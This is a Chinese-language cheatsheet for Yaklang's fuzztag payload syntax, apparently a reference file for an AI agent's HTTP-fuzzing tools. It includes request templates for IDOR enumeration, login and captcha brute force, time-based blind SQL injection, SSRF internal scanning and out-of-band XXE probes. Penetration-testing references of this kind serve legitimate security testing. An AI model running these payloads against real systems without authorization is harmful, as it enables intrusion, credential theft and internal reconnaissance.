---
name: fuzztag
description: 必传: fuzzTagMode: "standard" fuzztag 是 Yaklang 的 payload DSL,在请求模板里写 {{...}} 占位符,引擎渲染时自动展开。
category: cheatsheet
---

# fuzztag 速查 (toolPlus)

← [mcp-tools-finder.md](../mcp-tools-finder.md) | 适用工具:`mcp__yaklang__http_fuzzer` / `mcp__yaklang__render_fuzztag`

> **必传**: `fuzzTagMode: "standard"`
> fuzztag 是 Yaklang 的 payload DSL,在请求模板里写 `{{...}}` 占位符,引擎渲染时自动展开。

---

## §1 完整速查表

```
{{int(1-100)}}              数值连续 (BOLA/IDOR 批量)
{{int(1,5,10,100)}}         数值列表 (边界值)
{{randstr(8)}}              随机字符串
{{randint(1000)}}           随机数
{{timestamp(s)}}            时间戳秒
{{timestamp(ms)}}           时间戳毫秒
{{date}}                    今天日期 (yyyy-MM-dd)
{{datetime}}                日期时间
{{base64(payload)}}         base64 编码
{{base64dec(...)}}          base64 解码
{{md5(value)}}              MD5
{{sha1(value)}}             SHA1
{{sha256(value)}}           SHA256
{{file:dict.txt}}           字典文件 (逐行)
{{file_line:dict.txt:0-10}} 字典指定行范围
{{repeat(payload,5)}}       重复 N 次
{{ip(1.1.1.1-1.1.1.10)}}    IP 范围
{{ip(192.168.1.0/24)}}      CIDR
{{port(80,443,8080-8090)}}  端口范围
{{regen(\d{4})}}            正则生成 (验证码爆破!)
{{regen([a-z]{6})}}         6 位小写字母 (dnslog.cn 子域格式)
{{quote(payload)}}          URL 编码
{{urlescape(payload)}}      URL 编码 (同 quote)
{{unicode(text)}}           Unicode 编码
{{hex(text)}}               十六进制
{{html(text)}}              HTML 实体
{{x(payload)}}              不编码,原样(用于 ASCII 不安全字符)
{{int_padzero(1-10,3)}}     补零数字 (001/002/003)
```

---

## §2 实战示例

### BOLA 1-1000 枚举

```
GET /api/user?id={{int(1-1000)}} HTTP/1.1
Host: target.com
```

### 多字典组合(用户名 + 密码笛卡尔积)

```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username={{file:users.txt}}&password={{file:pass.txt}}
```

### 验证码 4 位爆破

```
POST /verify HTTP/1.1
Host: target.com

code={{regen(\d{4})}}
```

### 时间盲注 (SQLi)

```
GET /api?id=1 AND SLEEP({{int(1,3,5)}}) HTTP/1.1
Host: target.com
```
观察 http_fuzzer 返回的 `duration` 字段,差异显著 = 时间盲注。

### 内网扫描

```
GET /ssrf?url=http://{{ip(192.168.1.0/24)}}:{{port(80,443,8080-8090)}}/ HTTP/1.1
Host: target.com
```

### OOB 随机子域(配合 dnslog.cn)

```
GET /xxe?url=http://{{regen([a-z]{6})}}.your-dnslog-id.dnslog.cn/ HTTP/1.1
```

---

## §3 与 `mcp__yaklang__render_fuzztag` 配合

不想直接发包,只想看 fuzztag 展开成什么样:

```json
{
  "tool": "mcp__yaklang__render_fuzztag",
  "template": "id={{int(1-3)}}&code={{regen(\\d{4})}}",
  "limit": 9
}
```

返回所有展开结果,便于先看 payload 再决定是否发包。

---

## §4 常见错误

| 错误 | 原因 |
|---|---|
| fuzztag 不渲染,字面发出 `{{...}}` | 忘传 `fuzzTagMode: "standard"` |
| `{{file:...}}` 报找不到 | 字典文件路径必须用 Yakit 已保存的 payload group 名,不是文件系统路径 |
| `{{regen(...)}}` 渲染极慢 | 正则太宽,如 `[a-zA-Z0-9]{20}` 组合爆炸,改窄字符集 |
| 笛卡尔积太大 | 双 `{{file:...}}` 时,N×M 巨大;改成 `{{file_line:...}}` 切片或减小字典 |

---

*fuzztag cheatsheet v1.0 — 2026-05-24*
